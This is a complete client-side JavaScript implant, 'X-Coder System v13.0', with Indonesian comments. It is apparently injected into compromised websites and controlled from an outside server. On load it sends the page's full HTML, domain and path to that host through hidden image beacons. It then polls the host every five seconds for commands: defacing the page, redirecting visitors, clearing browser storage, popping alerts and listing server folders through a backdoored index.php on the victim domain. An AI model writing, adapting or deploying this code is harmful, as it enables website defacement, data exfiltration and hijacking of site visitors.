/**
 * X-Coder System v13.0 - CLIENT SIDE
 * Deface + Restore + File Explorer + Alert + Redirect + Clear
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // SIMPAN BACKUP HTML ASLI
    // ============================================================
    function backupOriginal() {
        var html = document.documentElement.outerHTML;
        var url = SERVER + '?backup=1&action=save&domain=' + encodeURIComponent(getDomain()) + '&html=' + encodeURIComponent(html);
        
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    // ============================================================
    // RESTORE HTML ASLI
    // ============================================================
    function restoreOriginal() {
        var url = SERVER + '?backup=1&action=restore&domain=' + encodeURIComponent(getDomain());
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.status === 'ok' && data.html) {
                    document.documentElement.innerHTML = data.html;
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // KIRIM DATA (BEACON)
    // ============================================================
    function sendBeacon() {
        var url = SERVER + '?log=1&domain=' + encodeURIComponent(getDomain()) + '&path=' + encodeURIComponent(window.location.pathname);
        
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    // ============================================================
    // CEK PERINTAH
    // ============================================================
    function checkCommand() {
        var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(getDomain());
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.command) {
                    executeCommand(data.command, data);
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                // Backup dulu sebelum di-deface
                backupOriginal();
                // Ganti halaman
                document.documentElement.innerHTML = data.html || '<h1 style="text-align:center;margin-top:20%;color:red;font-size:72px;">🔥 HACKED</h1>';
                break;
                
            case 'undeface':
                restoreOriginal();
                break;
                
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
                
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
                
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Storage cleared!');
                break;
                
            case 'baca_folder':
                bacaFolder(data.path || '/');
                break;
        }
    }

    // ============================================================
    // BACA FOLDER (DI DOMAIN KORBAN)
    // ============================================================
    function bacaFolder(path) {
        var url = window.location.origin + '/index.php?baca_folder=1&path=' + encodeURIComponent(path);
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.status === 'ok') {
                    var msg = '📂 Folder: ' + data.path + '\n\n';
                    data.files.forEach(function(file) {
                        var icon = file.type === 'folder' ? '📁' : '📄';
                        var size = file.type === 'folder' ? '-' : (file.size / 1024).toFixed(1) + ' KB';
                        msg += icon + ' ' + file.name + ' (' + size + ')\n';
                    });
                    alert(msg);
                } else {
                    alert('❌ Gagal baca folder');
                }
            })
            .catch(function() {
                alert('❌ Error baca folder');
            });
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    // Backup HTML asli pertama kali
    setTimeout(backupOriginal, 100);
    
    // Kirim beacon
    setTimeout(sendBeacon, 500);
    setInterval(sendBeacon, 30000);
    
    // Cek perintah setiap 5 detik
    setInterval(checkCommand, 5000);

    console.log('🔍 X-Coder System v13.0 started on:', getDomain());
})();
